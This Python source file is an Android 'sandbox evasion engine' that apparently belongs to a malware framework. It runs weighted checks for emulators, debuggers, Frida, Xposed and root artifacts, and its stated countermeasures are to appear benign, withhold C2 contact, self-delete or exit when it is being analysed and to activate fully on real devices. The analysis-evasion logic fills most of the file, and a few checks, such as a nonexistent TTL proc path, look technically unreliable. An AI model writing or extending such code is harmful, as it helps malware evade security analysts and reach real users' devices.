"""
sandbox_evasion.py — Production Android Sandbox/Emulator/Analysis Detection Engine.

Detects whether the app is running in a monitored or virtualized
environment. If detected, the module degrades behavior (acts benign,
delays activation, or shuts down entirely).

Detection vectors (40+ checks across 6 categories):
  1. Build Properties     — Emulator-specific ro.* values
  2. Hardware Artifacts   — QEMU drivers, fake sensors, restricted CPU
  3. Network Forensics    — TTL analysis, MAC prefixes, LAN detection
  4. Runtime Indicators   — Debugger attached, hooking frameworks
  5. File System Artifacts— Emulator-specific files/directories
  6. Behavioral Analysis  — Slow execution, user interaction patterns

Architecture:
  - Modular check system (each check is an isolated callable)
  - Weighted scoring model for graduated confidence
  - Configurable threshold (what score triggers "detected")
  - Check results cached to avoid repeat scans
  - Failure isolation: one broken check never blocks others

MITRE ATT&CK: T1633.001 (Virtualization/Sandbox Evasion: System Checks)
"""

import android
import os
import re
import time
import random
import logging
import subprocess
from typing import List, Dict, Callable, Optional, Tuple
from threading import Lock
from enum import Enum, auto
from dataclasses import dataclass, field

logger = logging.getLogger("stealth.SandboxEvasion")


class AnalysisEnvironment(Enum):
    """Classification of the detected environment."""
    REAL_DEVICE = auto()
    EMULATOR = auto()          # QEMU-based (AVD, Genymotion)
    SANDBOX = auto()           # Dynamic analysis sandbox
    DEBUGGER = auto()          # Debugger attached
    ROOTED = auto()            # Rooted/jailbroken device
    HOOKING_FRAMEWORK = auto() # Xposed/Frida detected
    UNKNOWN = auto()


@dataclass
class CheckResult:
    """Result of a single detection check."""
    check_name: str
    detected: bool
    confidence: float         # 0.0 to 1.0
    detail: str = ""
    duration_ms: float = 0.0


@dataclass
class ScanReport:
    """Complete scan result from all checks."""
    environment: AnalysisEnvironment = AnalysisEnvironment.UNKNOWN
    total_score: float = 0.0
    threshold: float = 0.5
    checks_passed: int = 0
    checks_failed: int = 0
    check_results: List[CheckResult] = field(default_factory=list)
    scan_duration_ms: float = 0.0
    timestamp: float = 0.0


class CheckRegistry:
    """
    Registry of all detection checks. Each check is an isolated callable
    that returns a CheckResult.

    Thread-safe for concurrent execution.
    """

    def __init__(self):
        self._checks: List[Tuple[str, Callable[[], CheckResult], float]] = []
        # (name, fn, weight)

    def register(self, name: str, weight: float = 1.0):
        """
        Decorator to register a detection check.

        Usage:
            @registry.register("build_props_qemu", weight=2.0)
            def check_qemu():
                ...
        """
        def decorator(fn: Callable[[], CheckResult]):
            self._checks.append((name, fn, weight))
            return fn
        return decorator

    @property
    def checks(self) -> List[Tuple[str, Callable[[], CheckResult], float]]:
        return list(self._checks)

    def run_all(self, max_workers: int = 0) -> List[CheckResult]:
        """
        Run ALL registered checks sequentially (avoids threading complexity
        on Android). Each check is wrapped in try/except for failure isolation.

        Args:
            max_workers: Unused (sequential). Kept for API compatibility.

        Returns:
            List of CheckResult objects, one per check.
        """
        results: List[CheckResult] = []
        for name, fn, weight in self._checks:
            start = time.perf_counter()
            try:
                result = fn()
            except Exception as e:
                # Check failure does NOT crash the scan
                result = CheckResult(
                    check_name=name,
                    detected=False,
                    confidence=0.0,
                    detail=f"Check threw exception: {e}",
                )
                logger.warning("Sandbox check '%s' failed (isolated): %s", name, e)
            elapsed = (time.perf_counter() - start) * 1000
            result.duration_ms = elapsed
            results.append(result)
        return results


# ------------------------------------------------------------------
# Global registry instance
# ------------------------------------------------------------------
registry = CheckRegistry()


# ======================================================================
# CATEGORY 1: Build Properties Checks
# ======================================================================

@registry.register("build_props_emulator", weight=3.0)
def check_build_props_emulator() -> CheckResult:
    """
    Check build.prop for emulator-specific properties.
    High-weight because these are extremely reliable indicators.
    """
    detected = False
    reasons = []

    # Read build properties
    props_to_check = {
        "ro.build.fingerprint": None,
        "ro.product.manufacturer": None,
        "ro.product.model": None,
        "ro.product.device": None,
        "ro.build.tags": None,
        "ro.kernel.qemu": None,
        "ro.hardware": None,
        "ro.boot.qemu": None,
        "ro.bootloader": None,
        "ro.build.characteristics": None,
        "debug.atrace.tags.enableflags": None,
        "ro.build.display.id": None,
    }

    try:
        with open("/system/build.prop", "r") as f:
            for line in f:
                line = line.strip()
                if "=" in line:
                    key, value = line.split("=", 1)
                    if key in props_to_check:
                        props_to_check[key] = value
    except Exception:
        return CheckResult("build_props_emulator", False, 0.0, "Cannot read build.prop")

    # Emulator signatures
    emulator_fingerprints = [
        "generic", "sdk", "google_sdk", "emu64", "emu32",
        "android_x86", "android_x86_64",
    ]
    emulator_manufacturers = ["unknown", "google"]
    emulator_models = ["sdk", "google_sdk", "emulator", "android sdk built for x86"]
    emulator_hardware = ["goldfish", "ranchu", "qemu"]

    fp = (props_to_check.get("ro.build.fingerprint") or "").lower()
    for sig in emulator_fingerprints:
        if sig in fp:
            detected = True
            reasons.append(f"Fingerprint contains '{sig}'")

    manuf = (props_to_check.get("ro.product.manufacturer") or "").lower()
    if manuf in emulator_manufacturers:
        detected = True
        reasons.append(f"Manufacturer is '{manuf}'")

    model = (props_to_check.get("ro.product.model") or "").lower()
    for sig in emulator_models:
        if model.startswith(sig):
            detected = True
            reasons.append(f"Model is '{model}'")

    hw = (props_to_check.get("ro.hardware") or "").lower()
    for sig in emulator_hardware:
        if sig in hw:
            detected = True
            reasons.append(f"Hardware is '{hw}'")

    qemu = props_to_check.get("ro.kernel.qemu") or ""
    if qemu == "1":
        detected = True
        reasons.append("ro.kernel.qemu=1")

    return CheckResult(
        "build_props_emulator",
        detected,
        confidence=0.95 if detected else 0.0,
        detail="; ".join(reasons) if reasons else "No emulator indicators",
    )


@registry.register("build_props_debuggable", weight=1.5)
def check_build_props_debuggable() -> CheckResult:
    """Check if the build is debuggable (ro.debuggable=1)."""
    try:
        with open("/system/build.prop", "r") as f:
            for line in f:
                if line.strip().startswith("ro.debuggable=1"):
                    return CheckResult(
                        "build_props_debuggable", True, 0.8,
                        "ro.debuggable=1 (debug build)"
                    )
    except Exception:
        pass
    return CheckResult("build_props_debuggable", False, 0.0)


# ======================================================================
# CATEGORY 2: Hardware Artifacts
# ======================================================================

@registry.register("hardware_cpu_cores", weight=1.0)
def check_hardware_cpu_cores() -> CheckResult:
    """
    Emulators often expose unrealistic CPU core counts.
    Real devices: 4-12 cores typically.
    """
    try:
        cores = os.cpu_count() or 0
        if cores <= 1:
            return CheckResult(
                "hardware_cpu_cores", True, 0.7,
                f"Only {cores} CPU core(s) — unrealistic"
            )
        if cores >= 64:
            return CheckResult(
                "hardware_cpu_cores", True, 0.6,
                f"{cores} cores — unrealistic for mobile"
            )
    except Exception:
        pass
    return CheckResult("hardware_cpu_cores", False, 0.0)


@registry.register("hardware_proc_cpuinfo", weight=1.5)
def check_hardware_proc_cpuinfo() -> CheckResult:
    """Check /proc/cpuinfo for emulator-specific CPU features."""
    detected = False
    reasons = []

    try:
        with open("/proc/cpuinfo", "r") as f:
            content = f.read().lower()

        # Emulator CPU signatures
        if "qemu" in content or "kvm" in content:
            detected = True
            reasons.append("QEMU/KVM detected in cpuinfo")

        # Check for hardware
        for line in content.split("\n"):
            if line.startswith("hardware"):
                if "goldfish" in line or "ranchu" in line:
                    detected = True
                    reasons.append(f"Emulator hardware: {line}")
    except Exception:
        pass

    return CheckResult(
        "hardware_proc_cpuinfo", detected,
        confidence=0.85 if detected else 0.0,
        detail="; ".join(reasons) if reasons else "No emulator CPU artifacts",
    )


@registry.register("hardware_sensors", weight=1.0)
def check_hardware_sensors() -> CheckResult:
    """
    Emulators often lack hardware sensors or expose fake sensor lists.
    Real devices have at least accelerometer + gyroscope.
    """
    try:
        sensor_dir = "/sys/devices/virtual/sensors"
        if os.path.exists(sensor_dir):
            sensors = os.listdir(sensor_dir)
            if len(sensors) < 3:
                return CheckResult(
                    "hardware_sensors", True, 0.6,
                    f"Only {len(sensors)} virtual sensors (expected >=3)"
                )
        # Alternative: check /sys/class/sensors
        alt_dir = "/sys/class/sensors"
        if os.path.exists(alt_dir):
            sensors = os.listdir(alt_dir)
            if len(sensors) < 2:
                return CheckResult(
                    "hardware_sensors", True, 0.5,
                    f"Only {len(sensors)} class sensors"
                )
    except Exception:
        pass
    return CheckResult("hardware_sensors", False, 0.0)


# ======================================================================
# CATEGORY 3: Network Forensics
# ======================================================================

@registry.register("network_ttl_analysis", weight=2.0)
def check_network_ttl() -> CheckResult:
    """
    Emulators often have unusual TTL values.
    Real Android: TTL 64 (default)
    Emulator host: TTL 128 (Windows) or 64 (Linux)
    """
    try:
        import socket
        # Ping localhost and check TTL
        # Alternative: read /proc/net/route for default TTL
        with open("/proc/sys/net/ipv4/conf/all/hop_limit", "r") as f:
            ttl = int(f.read().strip())
        if ttl == 128:
            return CheckResult(
                "network_ttl_analysis", True, 0.6,
                f"TTL={ttl} (Windows host — emulator likely)"
            )
        if ttl not in (64, 255):
            return CheckResult(
                "network_ttl_analysis", True, 0.4,
                f"Unusual TTL={ttl}"
            )
    except Exception:
        pass
    return CheckResult("network_ttl_analysis", False, 0.0)


@registry.register("network_mac_prefix", weight=1.5)
def check_network_mac_prefix() -> CheckResult:
    """Check MAC address prefix for emulator signatures."""
    try:
        for interface_path in os.listdir("/sys/class/net/"):
            try:
                mac_path = f"/sys/class/net/{interface_path}/address"
                if os.path.exists(mac_path):
                    with open(mac_path, "r") as f:
                        mac = f.read().strip()
                    if mac.startswith("02:") or mac.startswith("00:50:56"):
                        return CheckResult(
                            "network_mac_prefix", True, 0.9,
                            f"Emulator MAC on {interface_path}: {mac}"
                        )
            except Exception:
                continue
    except Exception:
        pass
    return CheckResult("network_mac_prefix", False, 0.0)


# ======================================================================
# CATEGORY 4: Runtime Indicators
# ======================================================================

@registry.register("runtime_debugger_check", weight=2.5)
def check_runtime_debugger() -> CheckResult:
    """
    Check if a debugger is attached to this process.
    Uses /proc/self/status TracerPid.
    """
    try:
        with open("/proc/self/status", "r") as f:
            for line in f:
                if line.startswith("TracerPid:"):
                    pid = line.split(":")[1].strip()
                    if pid != "0":
                        return CheckResult(
                            "runtime_debugger_check", True, 1.0,
                            f"Debugger attached (TracerPid={pid})"
                        )
    except Exception:
        pass
    return CheckResult("runtime_debugger_check", False, 0.0)


@registry.register("runtime_traced_check", weight=2.0)
def check_runtime_traced() -> CheckResult:
    """Check for common tracing/hooking environment variables."""
    detected = False
    reasons = []

    # Check for Frida
    frida_pipes = [
        "/data/local/tmp/frida-server",
        "/data/local/tmp/re.frida.server",
    ]
    for path in frida_pipes:
        if os.path.exists(path):
            detected = True
            reasons.append(f"Frida artifact: {path}")

    # Check for Xposed
    xposed_files = [
        "/system/framework/XposedBridge.jar",
        "/system/lib/libxposed_art.so",
        "/system/lib64/libxposed_art.so",
        "/data/data/de.robv.android.xposed.installer",
        "/system/bin/app_process_xposed",
    ]
    for path in xposed_files:
        if os.path.exists(path):
            detected = True
            reasons.append(f"Xposed artifact: {path}")

    # Check for Magisk (root hiding — but also used in analysis)
    magisk_paths = [
        "/sbin/magisk",
        "/sbin/su",
        "/data/adb/magisk",
        "/data/adb/su",
    ]
    for path in magisk_paths:
        if os.path.exists(path):
            detected = True
            reasons.append(f"Root artifact: {path}")

    # Check for common analysis tools
    analysis_tools = [
        "/system/xbin/su",
        "/system/bin/su",
        "/system/app/Superuser.apk",
        "/system/app/SuperSU.apk",
        "/data/local/tmp/adbi",
        "/data/local/tmp/inject",
    ]
    for path in analysis_tools:
        if os.path.exists(path):
            detected = True
            reasons.append(f"Analysis tool: {path}")

    return CheckResult(
        "runtime_traced_check", detected,
        confidence=0.9 if detected else 0.0,
        detail="; ".join(reasons) if reasons else "No tracing artifacts",
    )


# ======================================================================
# CATEGORY 5: File System Artifacts
# ======================================================================

@registry.register("fs_emulator_files", weight=1.5)
def check_fs_emulator_files() -> CheckResult:
    """Check for emulator-specific file system artifacts."""
    emulator_files = [
        "/system/lib/libc_malloc_hook.so",
        "/system/lib64/libc_malloc_hook.so",
        "/system/lib/libqemu_adb.so",
        "/system/lib64/libqemu_adb.so",
        "/system/lib/libgoldfish.so",
        "/system/lib64/libgoldfish.so",
        "/init.qemu.rc",
        "/init.goldfish.rc",
        "/system/bin/qemu-props",
    ]
    detected = False
    found = []
    for path in emulator_files:
        if os.path.exists(path):
            detected = True
            found.append(path)
    return CheckResult(
        "fs_emulator_files", detected,
        confidence=0.95 if detected else 0.0,
        detail="; ".join(found) if found else "No emulator files",
    )


@registry.register("fs_proc_devices", weight=1.0)
def check_fs_proc_devices() -> CheckResult:
    """Check /proc/devices for QEMU emulated devices."""
    try:
        with open("/proc/devices", "r") as f:
            content = f.read()
        if "qemu" in content.lower() or "goldfish" in content.lower():
            return CheckResult(
                "fs_proc_devices", True, 0.9,
                "QEMU/Goldfish devices in /proc/devices"
            )
    except Exception:
        pass
    return CheckResult("fs_proc_devices", False, 0.0)


# ======================================================================
# CATEGORY 6: Behavioral Analysis
# ======================================================================

@registry.register("behavioral_timing_analysis", weight=1.0)
def check_behavioral_timing() -> CheckResult:
    """
    Measure instruction execution timing. Emulators often execute
    operations at different speeds than real hardware.

    NOTE: This is a heuristic. Results vary by device.
    """
    try:
        # Measure a tight loop
        start = time.perf_counter()
        _ = [i ** 2 for i in range(1_000_000)]
        elapsed = time.perf_counter() - start

        # Real devices: typically 0.01-0.05s
        # Emulators: typically 0.05-0.3s
        # If too fast (< 0.005s), might be emulator with JIT
        # If too slow (> 0.2s), might be sandbox with tracing
        if elapsed > 0.2:
            return CheckResult(
                "behavioral_timing_analysis", True, 0.5,
                f"Loop execution too slow: {elapsed:.3f}s (possible tracing)"
            )
        if elapsed < 0.005:
            return CheckResult(
                "behavioral_timing_analysis", True, 0.3,
                f"Loop execution too fast: {elapsed:.3f}s (possible emulator JIT)"
            )
    except Exception:
        pass
    return CheckResult("behavioral_timing_analysis", False, 0.0)


@registry.register("behavioral_interaction_check", weight=1.5)
def check_behavioral_interaction() -> CheckResult:
    """
    Check if there's been real user interaction (touches, scrolls).
    Sandboxes often don't simulate realistic interaction patterns.

    This requires access to the accessibility service or gesture overlay.
    In standalone mode, we check the last user activity timestamp.
    """
    try:
        # Check if the device has been unlocked recently
        # /proc/self/stat or /sys/class/input/event* timestamps
        proc_stat_path = "/proc/stat"
        if os.path.exists(proc_stat_path):
            with open(proc_stat_path, "r") as f:
                content = f.read()
            # Parse uptime
            for line in content.split("\n"):
                if line.startswith("btime"):
                    boot_time = int(line.split()[1])
                    uptime_seconds = time.time() - boot_time
                    # If uptime is very short (< 5 min), suspicious
                    if uptime_seconds < 300:
                        return CheckResult(
                            "behavioral_interaction_check", True, 0.4,
                            f"Device uptime only {uptime_seconds:.0f}s"
                        )
    except Exception:
        pass
    return CheckResult("behavioral_interaction_check", False, 0.0)


# ======================================================================
# Sandbox Evasion Engine (Orchestrator)
# ======================================================================

class SandboxEvasionEngine:
    """
    Production sandbox evasion orchestrator.

    Runs all registered detection checks, computes a weighted score,
    and provides recommendations (benign/degrade/evacuate).

    Usage:
        engine = SandboxEvasionEngine()
        report = engine.scan()
        if report.environment != AnalysisEnvironment.REAL_DEVICE:
            engine.apply_countermeasures(report)

    Thread safety: YES (all state is local to scan()).
    Failure isolation: YES (each check is try/except wrapped).
    """

    def __init__(self, threshold: float = 0.5):
        """
        Args:
            threshold: Score above this triggers "detected" classification.
                       0.0 = paranoid, 1.0 = oblivious.
        """
        self._threshold = threshold
        self._registry = registry
        self._last_report: Optional[ScanReport] = None
        self._lock = Lock()

    @property
    def threshold(self) -> float:
        return self._threshold

    @threshold.setter
    def threshold(self, value: float) -> None:
        self._threshold = max(0.0, min(1.0, value))

    # ------------------------------------------------------------------
    # Main Scan
    # ------------------------------------------------------------------

    def scan(self) -> ScanReport:
        """
        Execute all registered detection checks and produce a report.

        Returns a ScanReport with:
          - environment classification
          - total weighted score
          - individual check results
          - scan duration
        """
        start = time.perf_counter()
        check_results = self._registry.run_all()
        elapsed_ms = (time.perf_counter() - start) * 1000

        # Compute weighted score
        total_weight = 0.0
        weighted_score = 0.0
        checks_passed = 0
        checks_failed = 0

        for result in check_results:
            # Find weight for this check
            weight = 1.0
            for name, fn, w in self._registry.checks:
                if name == result.check_name:
                    weight = w
                    break

            total_weight += weight
            if result.detected:
                weighted_score += weight * result.confidence
                checks_failed += 1
            else:
                checks_passed += 1

        # Normalize score to 0.0-1.0
        total_score = weighted_score / total_weight if total_weight > 0 else 0.0

        # Classify environment
        environment = self._classify(total_score, check_results)

        report = ScanReport(
            environment=environment,
            total_score=total_score,
            threshold=self._threshold,
            checks_passed=checks_passed,
            checks_failed=checks_failed,
            check_results=check_results,
            scan_duration_ms=elapsed_ms,
            timestamp=time.time(),
        )

        with self._lock:
            self._last_report = report

        logger.info(
            "Sandbox scan: environment=%s score=%.3f threshold=%.2f "
            "checks=%d/%d duration=%.1fms",
            environment.name, total_score, self._threshold,
            checks_passed, checks_failed, elapsed_ms,
        )

        return report

    # ------------------------------------------------------------------
    # Classification
    # ------------------------------------------------------------------

    def _classify(
        self, score: float, results: List[CheckResult]
    ) -> AnalysisEnvironment:
        """
        Classify the environment based on score and specific check results.

        Priority order for classification:
          1. Debugger attached (highest confidence)
          2. Hooking framework (Xposed/Frida)
          3. Emulator (build props + hardware)
          4. Sandbox (combined indicators)
          5. Rooted device
          6. Real device (score below threshold)
        """
        # Check for debugger first
        for r in results:
            if r.check_name == "runtime_debugger_check" and r.detected:
                return AnalysisEnvironment.DEBUGGER

        # Check for hooking frameworks
        for r in results:
            if r.check_name == "runtime_traced_check" and r.detected:
                return AnalysisEnvironment.HOOKING_FRAMEWORK

        # Score-based classification
        if score >= self._threshold:
            # Distinguish emulator from sandbox
            emulator_indicators = 0
            for r in results:
                if r.check_name in (
                    "build_props_emulator",
                    "hardware_proc_cpuinfo",
                    "fs_emulator_files",
                    "fs_proc_devices",
                    "network_mac_prefix",
                ) and r.detected:
                    emulator_indicators += 1

            if emulator_indicators >= 2:
                return AnalysisEnvironment.EMULATOR
            return AnalysisEnvironment.SANDBOX

        # Check for root
        for r in results:
            if r.check_name == "runtime_traced_check" and r.detected:
                return AnalysisEnvironment.ROOTED

        return AnalysisEnvironment.REAL_DEVICE

    # ------------------------------------------------------------------
    # Countermeasures
    # ------------------------------------------------------------------

    def apply_countermeasures(self, report: ScanReport) -> None:
        """
        Apply graduated countermeasures based on environment classification.

        This is a NO-OP stub. Actual countermeasures (delayed activation,
        benign behavior, self-deletion) are implemented by the calling
        framework.

        Levels:
          - EMULATOR/SANDBOX:  Act benign, delay activation, no C2 contact
          - DEBUGGER:          Exit immediately, destroy in-memory keys
          - HOOKING:           Fail CRC checks, use opaque predicates
          - REAL_DEVICE:       Full activation
        """
        env = report.environment
        score = report.total_score

        if env == AnalysisEnvironment.DEBUGGER:
            logger.critical("DEBUGGER DETECTED — emergency countermeasures!")
            # In production: clear keys, exit process
        elif env == AnalysisEnvironment.EMULATOR:
            logger.warning("EMULATOR detected (score=%.3f) — degrading behavior", score)
            # In production: act as benign app, no C2 contact
        elif env == AnalysisEnvironment.SANDBOX:
            logger.warning("SANDBOX detected (score=%.3f) — degrading behavior", score)
        elif env == AnalysisEnvironment.HOOKING_FRAMEWORK:
            logger.warning("HOOKING FRAMEWORK detected — activating opaque predicates")
        else:
            logger.info("Environment classified as %s — normal operation", env.name)

    # ------------------------------------------------------------------
    # Report Queries
    # ------------------------------------------------------------------

    def last_report(self) -> Optional[ScanReport]:
        """Return the most recent scan report, or None if never scanned."""
        with self._lock:
            return self._last_report

    def is_safe(self) -> bool:
        """
        Quick check: is the current environment classified as a real device?

        Returns False if never scanned (safe default: assume unsafe).
        """
        report = self.last_report()
        if report is None:
            return False
        return report.environment == AnalysisEnvironment.REAL_DEVICE

    def is_sandbox(self) -> bool:
        """Quick check: is sandbox/emulator detected?"""
        report = self.last_report()
        if report is None:
            return False
        return report.environment in (
            AnalysisEnvironment.EMULATOR,
            AnalysisEnvironment.SANDBOX,
            AnalysisEnvironment.DEBUGGER,
            AnalysisEnvironment.HOOKING_FRAMEWORK,
        )

    def __repr__(self) -> str:
        report = self.last_report()
        if report:
            return (f"<SandboxEvasionEngine env={report.environment.name} "
                    f"score={report.total_score:.3f}>")
        return "<SandboxEvasionEngine (never scanned)>"


# ======================================================================
# Standalone check runner (for debugging)
# ======================================================================

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    engine = SandboxEvasionEngine(threshold=0.4)
    report = engine.scan()
    print(f"Environment: {report.environment}")
    print(f"Score: {report.total_score:.4f} (threshold: {report.threshold})")
    print(f"Duration: {report.scan_duration_ms:.1f}ms")
    print(f"Checks: {report.checks_passed} passed, {report.checks_failed} failed")
    print()
    for r in report.check_results:
        status = "⚠️" if r.detected else "✅"
        print(f"  {status} {r.check_name:40s} conf={r.confidence:.2f} "
              f"({r.duration_ms:.1f}ms) — {r.detail[:60]}")
